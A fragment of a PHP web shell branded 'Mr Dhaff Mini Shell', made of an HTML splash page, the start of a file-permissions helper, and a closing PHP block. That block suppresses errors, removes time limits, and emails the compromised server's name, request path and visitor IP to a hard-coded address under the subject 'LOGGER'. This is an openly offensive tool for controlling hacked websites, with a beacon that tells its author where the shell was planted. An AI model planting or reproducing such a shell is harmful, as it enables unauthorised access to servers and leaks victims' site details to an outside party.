...
<title>MINI SHELL MR DHAFF</title><link rel="SHORTCUT ICON"  href="https://dhaffnavyz.github.io/my.care/images/profile-1.jpeg">
<style>
body{ 
...
<H1><center>Mr Dhaff Mini Shell</center></H1>
<DIV align=center><IMG src="https://telegra.ph/file/1639082273d7678096336.png" width=250 height=250><br>
...
<br>
<a href="https://m.youtube.com/channel/UC8WX-5Nqbp8JX_go_y88lMA/videos"><b><h3><font face="courier new" color="yellow">Dhaff Official</font></h3></b></a>
</center>
</BODY>
</HTML>';
function perms($file){
...
?>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'dhafaofficial@yahoo.com'; $x_path = "https://m.youtube.com/channel/UC8WX-5Nqbp8JX_go_y88lMA/videos" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>